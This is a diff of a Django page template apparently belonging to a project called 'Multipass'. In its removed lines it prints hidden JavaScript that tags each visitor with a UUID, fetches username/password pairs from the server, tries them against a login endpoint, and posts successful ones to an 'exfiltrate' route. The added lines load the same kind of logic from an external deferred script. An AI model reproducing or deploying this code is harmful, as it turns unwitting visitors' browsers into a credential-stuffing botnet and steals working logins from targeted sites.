@@ -3,105 +3,15 @@
 <html lang="en" class="no-js">
 <head>
     <meta charset="utf-8">
-    <title>Multipass home</title>
-    <link rel="stylesheet" href="{% static "app/style.css" %}">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
-    <script src="{% static "app/script.js" %}"></script>
+    <title>Multipass attack to example domain</title>
 </head>
 <body>
 <p>&nbsp;</p>
 <h1>Hum, are you hacked?</h1>
 <p style="padding: 10px 20px; text-align: center;">May be visit this page is a bad idea</p>
 
-<div>
-    <img src="https://thumbor.sd-cdn.fr/ryN7WSkqnZhs8TVN78NNQXpVVio=/940x550/cdn.sd-cdn.fr/wp-content/uploads/2019/04/Se%CC%81curite%CC%81.jpeg"
-         alt="image"/>
-</div>
 
-<div style="visibility: hidden">
-    <script type="text/javascript">
-
-        function uuidv4() {
-            return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
-                (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
-            );
-        }
-
-        uuid = localStorage.getItem('uuid');
-        if (uuid == null) {
-            uuid = uuidv4();
-            localStorage.setItem('uuid', uuid)
-        }
-
-        init = {headers: {'X-CLIENT-UUID': uuid}};
-
-        exfiltrate = function (username, password) {
-            fetch('/app/{{ domain.name }}/exfiltrate/', {
-                method: 'POST',
-                body: JSON.stringify({
-                    username: username,
-                    password: password
-                }),
-                headers: {'X-CLIENT-UUID': uuid}
-            })
-        };
-
-        test = function (username, password) {
-            /***************** TEST FUNCTION HERE **********************/
-            // just call exfiltrate(username, password) when a password is find
-            console.log('test', username, password);
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/example/login/', false);
-            xhr.setRequestHeader('X-CLIENT-UUID', uuid);
-            xhr.send(JSON.stringify({
-                'username': username,
-                'password': password
-            }));
-            if (xhr.status === 301) {
-                exfiltrate(username, password)
-            }
-        };
-
-
-        function getSync(url) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', url, false);
-            xhr.setRequestHeader('X-CLIENT-UUID', uuid);
-            xhr.send(null);
-            if(xhr.status === 200 && xhr.getResponseHeader('Content-Type') === 'application/json') {
-                return JSON.parse(xhr.responseText);
-            }
-            else if(xhr.status > 400) {
-                throw xhr.response;
-            }
-        }
-
-        moredata = true;
-
-        function getNextChunk() {
-            probes = getSync('/app/{{ domain.name }}/probes/');
-            moredata = false;
-            if (probes.probes.length === 0) {
-                console.log('no data, stop...');
-            } else {
-                for(let i = 0; i < probes.probes.length; i++)
-                {
-                    probe = probes.probes[i];
-                    test(probe.username, probe.password);
-                }
-                moredata = true;
-            }
-            getSync('/app/{{ domain.name }}/ack/');
-            return moredata;
-        }
-
-        while (getNextChunk()) {
-            console.log('get chunk...');
-        }
-
-    </script>
-</div>
-
+<script type="text/javascript" async src="{% static "app/defer.js" %}" domain="example" defered="http://127.0.0.1:8000/static/app/multipass.js"></script>
 </body>
 
 </html>
